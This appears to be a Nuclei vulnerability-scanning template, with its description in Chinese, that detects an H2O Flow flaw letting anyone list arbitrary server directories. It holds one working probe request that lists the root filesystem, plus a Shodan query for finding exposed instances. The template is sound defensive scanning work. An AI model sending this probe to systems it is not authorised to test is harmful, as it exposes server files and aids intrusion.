id: h2o-arbitary-file-read

info:
  name: H2O 任意路径读取检测
  author: danmcinerney,byt3bl33d3r
  severity: medium
  description: |
    该模板用于核查 H2O 任意路径读取检测。该类问题通常源于文件上传、文件读取或路径访问控制配置不当，导致攻击者可读取敏感文件或上传非预期内容。模板会向目标发送探测请求，并依据匹配 `"/bin"`、匹配 `"__meta":`、匹配 `"schema_name":`等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可能读取配置、源码、凭据或系统文件，或上传可被服务器解析的恶意文件。
    - 成功利用后可能造成敏感信息泄露、站点篡改、远程代码执行或持久化入口。
  remediation: |
    - 为文件读取和上传接口增加严格认证授权与路径约束。
    - 限制上传文件类型、扩展名、大小和存储位置，禁止上传目录执行脚本。
    - 审计已上传文件和访问日志，移除异常文件并轮换可能泄露的凭据。
  reference:
    - https://huntr.com/bounties/e76372c2-39be-4984-a7c8-7048a75a25dc/
  classification:
    cwe-id: CWE-200
    cpe: cpe:2.3:a:h2o:h2o:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"H2O Flow"
    product: h2o
    vendor: h2o
  tags: h2o-3,h2o,info-leak,lfi,misconfig,vuln

http:
  - raw:
      - |
        GET /3/Typeahead/files?src=%2F&limit=10 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"/bin"'
          - '"__meta":'
          - '"schema_name":'
        condition: and

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200
